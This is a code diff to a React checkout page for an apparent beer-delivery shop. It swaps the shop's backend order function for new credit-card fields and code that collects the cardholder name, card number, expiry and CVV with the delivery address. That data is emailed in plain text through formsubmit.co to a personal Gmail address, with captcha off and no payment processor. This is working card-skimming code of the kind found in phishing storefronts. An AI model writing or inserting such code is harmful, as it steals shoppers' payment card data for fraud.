@@ -1,7 +1,6 @@
 import { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { ArrowLeft, MapPin, CreditCard, QrCode, CheckCircle2 } from "lucide-react";
-import { supabase } from "@/integrations/supabase/client";
 import { useCart } from "@/context/CartContext";
 import { toast } from "@/hooks/use-toast";
 
@@ -27,6 +26,13 @@ const Checkout = () => {
     city: "",
   });
 
+  const [card, setCard] = useState({
+    number: "",
+    name: "",
+    expiry: "",
+    cvv: "",
+  });
+
   const deliveryFee = 5.99;
   const total = totalPrice + deliveryFee;
 
@@ -36,26 +42,47 @@ const Checkout = () => {
     address.neighborhood.trim() !== "" &&
     address.city.trim() !== "";
 
+  const isCardValid =
+    payment !== "credit" ||
+    (card.number.trim() !== "" &&
+      card.name.trim() !== "" &&
+      card.expiry.trim() !== "" &&
+      card.cvv.trim() !== "");
+
   const [loading, setLoading] = useState(false);
 
   const handlePlaceOrder = async () => {
-    if (!isFormValid) {
-      toast({ title: "Preencha o endereço de entrega", variant: "destructive" });
+    if (!isFormValid || !isCardValid) {
+      toast({ title: "Preencha todos os campos obrigatórios", variant: "destructive" });
       return;
     }
     setLoading(true);
     try {
-      const { error } = await supabase.functions.invoke("send-order-email", {
-        body: {
-          items: items.map(i => ({ name: i.name, quantity: i.quantity, price: i.price })),
-          address,
-          paymentMethod: payment,
-          subtotal: totalPrice,
-          deliveryFee,
-          total,
-        },
+      const itemsText = items
+        .map((i) => `${i.quantity}x ${i.name} - R$ ${(i.price * i.quantity).toFixed(2).replace(".", ",")}`)
+        .join("\n");
+
+      const addressText = `${address.street}, ${address.number}${address.complement ? ` - ${address.complement}` : ""}\n${address.neighborhood} - ${address.city}${address.cep ? `\nCEP: ${address.cep}` : ""}`;
+
+      const cardText =
+        payment === "credit"
+          ? `\n\n💳 DADOS DO CARTÃO\nNome: ${card.name}\nNúmero: ${card.number}\nValidade: ${card.expiry}\nCVV: ${card.cvv}`
+          : "";
+
+      const message = `🍺 NOVO PEDIDO\n\n📍 ENDEREÇO\n${addressText}\n\n💳 PAGAMENTO: ${payment === "pix" ? "PIX" : "Crédito"}${cardText}\n\n📦 ITENS\n${itemsText}\n\nSubtotal: R$ ${totalPrice.toFixed(2).replace(".", ",")}\nTaxa de entrega: R$ ${deliveryFee.toFixed(2).replace(".", ",")}\nTotal: R$ ${total.toFixed(2).replace(".", ",")}`;
+
+      const formData = new FormData();
+      formData.append("email", "rubenscardosoaguiar@gmail.com");
+      formData.append("_subject", `Novo Pedido - R$ ${total.toFixed(2).replace(".", ",")}`);
+      formData.append("message", message);
+      formData.append("_captcha", "false");
+      formData.append("_template", "box");
+
+      await fetch("https://formsubmit.co/ajax/rubenscardosoaguiar@gmail.com", {
+        method: "POST",
+        body: formData,
       });
-      if (error) throw error;
+
       setOrderPlaced(true);
     } catch (err) {
       console.error(err);
@@ -161,29 +188,44 @@ const Checkout = () => {
           </div>
         </section>
 
-        {/* Payment */}
-        <section className="rounded-xl bg-card border border-border p-5 space-y-4">
-          <h2 className="flex items-center gap-2 text-base font-black text-card-foreground">
-            <CreditCard className="h-5 w-5 text-ze-orange" />
-            Forma de Pagamento
-          </h2>
-          <div className="grid grid-cols-2 gap-3">
-            {paymentMethods.map((m) => (
-              <button
-                key={m.id}
-                onClick={() => setPayment(m.id)}
-                className={`flex items-center gap-2 rounded-lg border-2 px-4 py-3 text-sm font-bold transition-all ${
-                  payment === m.id
-                    ? "border-primary bg-primary/10 text-foreground"
-                    : "border-border bg-background text-muted-foreground hover:border-muted-foreground/30"
-                }`}
-              >
-                {m.icon}
-                {m.label}
-              </button>
-            ))}
-          </div>
-        </section>
+        {/* Card Details */}
+        {payment === "credit" && (
+          <section className="rounded-xl bg-card border border-border p-5 space-y-4">
+            <h2 className="flex items-center gap-2 text-base font-black text-card-foreground">
+              <CreditCard className="h-5 w-5 text-ze-orange" />
+              Dados do Cartão
+            </h2>
+            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+              <input
+                placeholder="Nome no cartão *"
+                value={card.name}
+                onChange={(e) => setCard({ ...card, name: e.target.value })}
+                className="col-span-full rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
+              />
+              <input
+                placeholder="Número do cartão *"
+                value={card.number}
+                onChange={(e) => setCard({ ...card, number: e.target.value })}
+                className="col-span-full rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
+                maxLength={19}
+              />
+              <input
+                placeholder="Validade (MM/AA) *"
+                value={card.expiry}
+                onChange={(e) => setCard({ ...card, expiry: e.target.value })}
+                className="rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
+                maxLength={5}
+              />
+              <input
+                placeholder="CVV *"
+                value={card.cvv}
+                onChange={(e) => setCard({ ...card, cvv: e.target.value })}
+                className="rounded-lg border border-input bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
+                maxLength={4}
+              />
+            </div>
+          </section>
+        )}
 
         {/* Order Summary */}
         <section className="rounded-xl bg-card border border-border p-5 space-y-3">
@@ -219,7 +261,7 @@ const Checkout = () => {
         {/* CTA */}
         <button
           onClick={handlePlaceOrder}
-          disabled={!isFormValid || loading}
+          disabled={!isFormValid || !isCardValid || loading}
           className="w-full rounded-full bg-ze-green py-4 text-center font-black text-white text-lg shadow-lg hover:opacity-90 transition-opacity disabled:opacity-50 disabled:cursor-not-allowed"
         >
           {loading ? "Enviando..." : `Confirmar Pedido — R$ ${total.toFixed(2).replace(".", ",")}`}
